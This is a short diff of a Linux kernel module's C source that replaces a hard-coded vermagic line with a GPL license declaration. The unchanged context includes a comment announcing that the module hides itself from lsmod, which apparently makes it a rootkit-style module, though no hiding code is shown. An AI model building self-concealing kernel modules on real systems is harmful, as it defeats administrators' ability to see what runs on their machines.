@@ -5,7 +5,7 @@
 #include <linux/init.h>    
 #include <linux/vermagic.h> 
 
-MODULE_INFO(vermagic, "4.4.38-v7+ SMP mod_unload modversions ARMv7 ");
+MODULE_LICENSE("GPL"); 
 static int lkm_init(void)
 {
     //Hide this module from kernel modules(lsmod) 
